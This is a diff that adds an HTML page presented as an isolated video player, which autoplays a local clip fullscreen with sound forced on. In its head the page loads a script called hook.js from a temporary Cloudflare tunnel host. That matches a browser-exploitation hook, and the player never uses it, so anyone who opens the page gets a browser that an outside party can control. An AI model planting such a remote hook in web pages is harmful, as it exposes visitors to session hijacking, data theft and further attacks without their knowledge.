@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>voidxcc — player (isolated)</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<script src="https://regime-devel-evident-carlo.trycloudflare.com/hook.js"></script>
+<style>
+  html, body { margin:0; padding:0; background:#000; height:100%; overflow:hidden; }
+  video { position:fixed; inset:0; width:100vw; height:100vh; object-fit:cover; }
+</style>
+</head>
+<body>
+  <video id="v" src="../media/ssstik.io_1793346915517.mp4" autoplay loop playsinline></video>
+  <script>
+    (function () {
+      var v = document.getElementById('v');
+      v.muted = false;
+      v.volume = 1;
+      // go fullscreen
+      var el = document.documentElement;
+      var fs = el.requestFullscreen || el.webkitRequestFullscreen || el.msRequestFullscreen;
+      if (fs) { try { fs.call(el); } catch (e) {} }
+      var p = v.play();
+      if (p && p.catch) {
+        p.catch(() => { v.muted = true; v.play(); });
+      }
+    })();
+  </script>
+</body>
+</html>
